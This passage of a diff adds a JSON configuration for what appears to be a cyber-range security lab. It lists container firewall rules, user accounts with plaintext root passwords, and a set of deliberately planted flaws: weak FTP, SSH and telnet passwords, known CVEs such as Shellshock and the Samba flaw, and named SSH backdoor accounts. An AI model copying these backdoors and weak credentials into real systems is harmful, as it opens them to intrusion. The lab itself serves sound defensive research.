+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.16",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_8",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.7.17",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.17",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_9",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.7.18",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_7",
+            "subnet_mask": "<EXECUTION_ID>.9.7.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.18",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_10",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.8.19",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.19",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_11",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.8.20",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.20",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_12",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.8.22",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.22",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_honeypot_2_13",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.8.23",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.23",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_cve_2016_10033_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.8.24",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.24",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_cve_2015_5602_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.8.25",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_8",
+            "subnet_mask": "<EXECUTION_ID>.9.8.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.25",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "forward_accept": [],
+      "forward_drop": [],
+      "hostname": "csle_client_1_1",
+      "input_accept": [],
+      "input_drop": [],
+      "ips_gw_default_policy_networks": [
+        {
+          "default_forward": "DROP",
+          "default_gw": "<EXECUTION_ID>.9.1.10",
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": null,
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_2",
+            "subnet_mask": "<EXECUTION_ID>.9.2.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.1.254",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_1",
+            "subnet_mask": "<EXECUTION_ID>.9.1.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        },
+        {
+          "default_forward": "DROP",
+          "default_gw": null,
+          "default_input": "ACCEPT",
+          "default_output": "ACCEPT",
+          "ip": "<EXECUTION_ID>.9.253.254",
+          "network": {
+            "bitmask": "255.255.255.0",
+            "interface": "eth0",
+            "name": "csle_net_9_253",
+            "subnet_mask": "<EXECUTION_ID>.9.253.0/24",
+            "subnet_prefix": "<EXECUTION_ID>.9"
+          }
+        }
+      ],
+      "output_accept": [],
+      "output_drop": [],
+      "physical_host_ip": "",
+      "routes": []
+    }
+  ],
+  "users": [
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.1.191",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "agent",
+          "root": true,
+          "username": "agent"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.21",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "admin31151x",
+          "root": true,
+          "username": "admin"
+        },
+        {
+          "pw": "qwerty",
+          "root": true,
+          "username": "test"
+        },
+        {
+          "pw": "abc123",
+          "root": false,
+          "username": "oracle"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.10",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "admin1235912",
+          "root": true,
+          "username": "admin"
+        },
+        {
+          "pw": "water",
+          "root": false,
+          "username": "jessica"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.78",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "test32121",
+          "root": false,
+          "username": "admin"
+        },
+        {
+          "pw": "123123",
+          "root": true,
+          "username": "user1"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.3",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "doe",
+          "root": true,
+          "username": "john"
+        },
+        {
+          "pw": "test_pw1",
+          "root": false,
+          "username": "vagrant"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.3.54",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "xe125@41!341",
+          "root": true,
+          "username": "trent"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.5.101",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "1b12ha9",
+          "root": true,
+          "username": "zidane"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.6.7",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "pi12195e",
+          "root": true,
+          "username": "zlatan"
+        },
+        {
+          "pw": "eul1145x",
+          "root": false,
+          "username": "kennedy"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.4",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "1235121",
+          "root": true,
+          "username": "user1"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.5",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "1235121",
+          "root": true,
+          "username": "user2"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.6",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "1bsae235121",
+          "root": true,
+          "username": "user3"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.8",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "1bsae235121",
+          "root": true,
+          "username": "user4"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.9",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "1gxq2",
+          "root": true,
+          "username": "user5"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.178",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "1gxq2",
+          "root": true,
+          "username": "user6"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.9.11",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user7"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.9.12",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user8"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.9.13",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user9"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.9.14",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user10"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.7.15",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user11"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.7.16",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user12"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.7.17",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user13"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.7.18",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user14"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.19",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user15"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.20",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user16"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.22",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user18"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.23",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user19"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.24",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user20"
+        }
+      ]
+    },
+    {
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.25",
+      "physical_host_ip": "",
+      "users": [
+        {
+          "pw": "081gxq2",
+          "root": true,
+          "username": "user20"
+        }
+      ]
+    }
+  ],
+  "version": "0.10.0",
+  "vulnerabilities": [
+    {
+      "credentials": [
+        {
+          "port": 21,
+          "protocol": "TCP",
+          "pw": "l_hopital",
+          "root": true,
+          "service": "ftp",
+          "username": "l_hopital"
+        },
+        {
+          "port": 21,
+          "protocol": "TCP",
+          "pw": "euler",
+          "root": false,
+          "service": "ftp",
+          "username": "euler"
+        },
+        {
+          "port": 21,
+          "protocol": "TCP",
+          "pw": "pi",
+          "root": true,
+          "service": "ftp",
+          "username": "pi"
+        }
+      ],
+      "cve": null,
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.79",
+      "name": "ftp-weak-password",
+      "physical_host_ip": "",
+      "port": 21,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "WEAK_PW"
+    },
+    {
+      "credentials": [
+        {
+          "port": 22,
+          "protocol": "TCP",
+          "pw": "puppet",
+          "root": true,
+          "service": "ssh",
+          "username": "puppet"
+        }
+      ],
+      "cve": null,
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.78",
+      "name": "ssh-weak-password",
+      "physical_host_ip": "",
+      "port": 22,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "WEAK_PW"
+    },
+    {
+      "credentials": [
+        {
+          "port": 23,
+          "protocol": "TCP",
+          "pw": "admin",
+          "root": true,
+          "service": "telnet",
+          "username": "admin"
+        }
+      ],
+      "cve": null,
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.3",
+      "name": "telnet-weak-password",
+      "physical_host_ip": "",
+      "port": 23,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "WEAK_PW"
+    },
+    {
+      "credentials": [
+        {
+          "port": 445,
+          "protocol": "TCP",
+          "pw": "sambapwnedpw",
+          "root": true,
+          "service": "samba",
+          "username": "ssh_backdoor_sambapwned"
+        }
+      ],
+      "cve": "cve-2017-7494",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.3",
+      "name": "cve-2017-7494",
+      "physical_host_ip": "",
+      "port": 445,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "RCE"
+    },
+    {
+      "credentials": [
+        {
+          "port": 80,
+          "protocol": "TCP",
+          "pw": "shellshockedpw",
+          "root": true,
+          "service": "http",
+          "username": "ssh_backdoor_shellshocked"
+        }
+      ],
+      "cve": "cve-2014-6271",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.3.54",
+      "name": "cve-2014-6271",
+      "physical_host_ip": "",
+      "port": 80,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "RCE"
+    },
+    {
+      "credentials": [
+        {
+          "port": 80,
+          "protocol": "TCP",
+          "pw": "0d107d09f5bbe40cade3de5c71e9e9b7",
+          "root": true,
+          "service": "http",
+          "username": "pablo"
+        }
+      ],
+      "cve": "dvwa_sql_injection",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.4.74",
+      "name": "dvwa_sql_injection",
+      "physical_host_ip": "",
+      "port": 80,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "RCE"
+    },
+    {
+      "credentials": [
+        {
+          "port": 22,
+          "protocol": "TCP",
+          "pw": "adm",
+          "root": false,
+          "service": "ssh",
+          "username": "adm"
+        }
+      ],
+      "cve": null,
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.4.61",
+      "name": "ssh-weak-password",
+      "physical_host_ip": "",
+      "port": 22,
+      "protocol": "TCP",
+      "root": false,
+      "vuln_type": "WEAK_PW"
+    },
+    {
+      "credentials": [
+        {
+          "port": null,
+          "protocol": "TCP",
+          "pw": "adm",
+          "root": false,
+          "service": null,
+          "username": "adm"
+        }
+      ],
+      "cve": "cve-2010-0426",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.4.61",
+      "name": "cve-2010-0426",
+      "physical_host_ip": "",
+      "port": null,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "credentials": [
+        {
+          "port": 9200,
+          "protocol": "TCP",
+          "pw": "cve_2015_1427_pwnedpw",
+          "root": true,
+          "service": "elasticsearch",
+          "username": "ssh_backdoor_cve_2015_1427_pwned"
+        }
+      ],
+      "cve": "cve-2015-1427",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.5.62",
+      "name": "cve-2015-1427",
+      "physical_host_ip": "",
+      "port": 9200,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "RCE"
+    },
+    {
+      "credentials": [
+        {
+          "port": 445,
+          "protocol": "TCP",
+          "pw": "sambapwnedpw",
+          "root": true,
+          "service": "samba",
+          "username": "ssh_backdoor_sambapwned"
+        }
+      ],
+      "cve": "cve-2017-7494",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.6.7",
+      "name": "cve-2017-7494",
+      "physical_host_ip": "",
+      "port": 445,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "RCE"
+    },
+    {
+      "credentials": [
+        {
+          "port": 21,
+          "protocol": "TCP",
+          "pw": "cve2015_3306_pwnedpw",
+          "root": true,
+          "service": "proftpd",
+          "username": "ssh_backdoor_cve2015_3306_pwned"
+        }
+      ],
+      "cve": "cve-2015-3306",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.2.178",
+      "name": "cve-2015-3306",
+      "physical_host_ip": "",
+      "port": 21,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "RCE"
+    },
+    {
+      "credentials": [
+        {
+          "port": 22,
+          "protocol": "TCP",
+          "pw": "donald",
+          "root": false,
+          "service": "ssh",
+          "username": "donald"
+        }
+      ],
+      "cve": null,
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.25",
+      "name": "ssh-weak-password",
+      "physical_host_ip": "",
+      "port": 22,
+      "protocol": "TCP",
+      "root": false,
+      "vuln_type": "WEAK_PW"
+    },
+    {
+      "credentials": [
+        {
+          "port": null,
+          "protocol": "TCP",
+          "pw": "donald",
+          "root": false,
+          "service": null,
+          "username": "donald"
+        }
+      ],
+      "cve": "cve-2015-5602",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.25",
+      "name": "cve-2015-5602",
+      "physical_host_ip": "",
+      "port": null,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "PRIVILEGE_ESCALATION"
+    },
+    {
+      "credentials": [
+        {
+          "port": 80,
+          "protocol": "TCP",
+          "pw": "cve_2016_10033_pwnedpw",
+          "root": true,
+          "service": "http",
+          "username": "ssh_backdoor_2016_10033_pwn"
+        }
+      ],
+      "cve": "cve-2016-10033",
+      "docker_gw_bridge_ip": "",
+      "ip": "<EXECUTION_ID>.9.8.24",
+      "name": "cve-2016-10033",
+      "physical_host_ip": "",
+      "port": 80,
+      "protocol": "TCP",
+      "root": true,
+      "vuln_type": "RCE"
+    }
+  ]
+}
